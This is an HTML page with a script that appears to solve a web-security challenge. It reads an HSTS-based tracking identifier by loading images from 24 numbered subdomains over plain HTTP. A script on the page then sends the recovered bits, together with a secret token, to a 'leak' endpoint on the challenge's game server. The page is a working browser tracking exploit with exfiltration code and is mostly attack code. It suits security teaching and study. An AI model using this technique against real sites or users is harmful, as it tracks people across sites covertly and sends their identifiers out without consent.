<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>HSTS bit dumper</title>
</head>
<body>
<script>
/* callback provided by the game server */
function leak(data) {
  fetch(`https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`);
}

/* probe a single sub‑domain */
async function bit(n) {
  return await new Promise(res => {
    const img = new Image();
    img.onload  = () => res(1);         // HTTP load succeeded  → bit 1
    img.onerror = () => res(0);         // upgraded & failed    → bit 0
    img.src = `http://${n}.tracking.jeopardy.websec.saarland/get?x=${Math.random()}`;
  });
}

/* main */
(async () => {
  const bits = [];
  for (let i = 0; i < 24; i++) bits.push(await bit(i));   // 0 … 23
  leak(bits.join(''));   // e.g. "01101010…"
})();
</script>
</body>
</html>
